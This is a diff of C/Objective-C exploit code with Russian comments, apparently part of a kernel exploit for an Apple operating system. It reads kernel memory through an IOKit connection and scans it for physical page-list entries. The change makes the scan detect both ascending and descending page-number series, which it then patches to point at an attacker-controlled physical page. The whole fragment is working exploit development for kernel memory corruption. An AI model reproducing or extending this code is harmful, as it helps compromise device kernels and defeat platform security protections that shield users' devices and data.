@@ -6290,22 +6290,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
                     uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
-                    // 1.9.239: PAGE-LIST в ОБЕИХ упаковках — SCAN B доказал: page-list
-                    // большой поверхности лежит как (4<<32)|pfn (hi32=4!), не голой.
-                    // Кластер-детектор: страница с ≥4 qword подряд вида lo32=pfn+i
-                    // при hi32 ∈ {0,4} — патчим ВСЮ серию с сохранением hi-формы.
+                    // 1.9.239: PAGE-LIST в ОБЕИХ упаковках и НАПРАВЛЕНИЯХ — SCAN B
+                    // доказал: список = (4<<32)|pfn и УБЫВАЮЩИЙ (pfn, pfn-1, …) —
+                    // арена аллоцирует физику сверху вниз. Детектор ±-направление.
                     {
-                        uint32_t run = 0, hiForm = 0;
+                        int dir = 0;   // +1 возрастающая, -1 убывающая
+                        uint32_t run = 0;
                         uint64_t mask = q;
-                        for (uint32_t r = 0; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
-                            uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
-                            uint32_t lo = (uint32_t)qn, hi = (uint32_t)(qn >> 32);
-                            if (lo == pfn32 + r && (hi == 0 || hi == 4)) { run++; hiForm |= hi; }
-                            else break;
+                        for (int tryDir = 1; tryDir >= -1 && !run; tryDir -= 2) {
+                            uint32_t rr = 0;
+                            for (uint32_t r = 0; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
+                                uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
+                                uint32_t lo = (uint32_t)qn, hi = (uint32_t)(qn >> 32);
+                                if (lo == (uint32_t)((int64_t)pfn32 + tryDir * (int)r) && (hi == 0 || hi == 4)) rr++;
+                                else break;
+                            }
+                            if (rr >= 4) { run = rr; dir = tryDir; }
                         }
                         if (run >= 4) {
-                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (hi=%u) @ %#llx+%#x — патчим все на ctlPFN %#x",
-                                      run, hiForm, (unsigned long long)kva, o, ctlPFN]);
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (%s) @ %#llx+%#x — патчим все на ctlPFN %#x",
+                                      run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o, ctlPFN]);
                             for (uint32_t r = 0; r < run; r++) {
                                 uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
                                 usleep(1500);
